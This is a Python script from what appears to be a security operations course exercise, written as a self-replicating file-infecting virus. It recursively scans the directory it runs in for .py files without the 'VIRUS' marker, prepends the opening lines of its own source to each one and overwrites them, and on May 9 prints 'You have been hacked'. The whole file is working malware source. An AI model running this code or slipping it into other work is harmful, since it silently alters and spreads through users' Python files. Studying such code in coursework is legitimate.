#!/usr/bin/env python3

# Script:                       Ops 301 Ops Chall #12
# Author:                       Brad Baack
# Date of latest revision:      04/9/2024
# Purpose:                      Malware 

import os
import datetime

SIGNATURE = "VIRUS"  # This is a marker the script uses to identify whether a file has been altered.

# Function to search and list files that are to be altered.
def locate(path):
    files_targeted = []  # Start with an empty list to hold the files that will be changed.
    filelist = os.listdir(path)  # Get a list of all items in the current directory.
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            # If the item is a folder, look inside it for more files.
            files_targeted.extend(locate(path+"/"+fname))
        elif fname[-3:] == ".py":
            # If the item ends in '.py', it could be a candidate for alteration.
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    # If the marker is found, the file has already been altered.
                    infected = True
                    break
            if not infected:
                # If the marker isn't found, add the file to the list to be changed.
                files_targeted.append(path+"/"+fname)
    return files_targeted

# Function to alter files.
def infect(files_targeted):
    virus = open(os.path.abspath(__file__))  # Open the current script file.
    virusstring = ""  # Prepare an empty string to store parts of the current file.
    for i,line in enumerate(virus):
        if 0 <= i < 39:
            # Copy the first portion of the script to replicate later.
            virusstring += line
    virus.close()  # Close the opened script file.
    for fname in files_targeted:
        f = open(fname)  # Open each file intended to be altered.
        temp = f.read()  # Read the original content of the file.
        f.close()
        f = open(fname, "w")  # Re-open the file to overwrite it.
        f.write(virusstring + temp)  # Add the script portion to the original content.
        f.close()

# Function to execute an action on a particular date.
def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print("You have been hacked")  # Message displayed on a specific date.

# The script execution starts here:
# It first finds files to change, then changes them, and finally checks the date for an action.
files_targeted = locate(os.path.abspath(""))
infect(files_targeted)
detonate()